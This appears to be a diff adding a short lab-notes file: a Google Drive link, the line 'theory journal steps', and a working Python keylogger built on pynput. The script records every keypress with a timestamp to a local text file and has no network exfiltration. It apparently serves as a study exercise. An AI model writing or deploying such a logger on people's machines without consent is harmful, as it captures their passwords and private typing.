@@ -1,0 +1,15 @@
+https://drive.google.com/drive/folders/1aQN6F2uwQKDqVp3xblaVjSUNXie5DUSq?usp=sharing
+
+theory journal steps
+
+
+from pynput.keyboard import Key, Listener
+import logging
+
+logging.basicConfig(filename=("kuchbhi.txt"),level=logging.DEBUG,format="%(asctime)s_%(message)s")
+
+def on_press(key):
+    logging.info(str(key))
+
+with Listener(on_press=on_press)as listener:
+    listener.join()
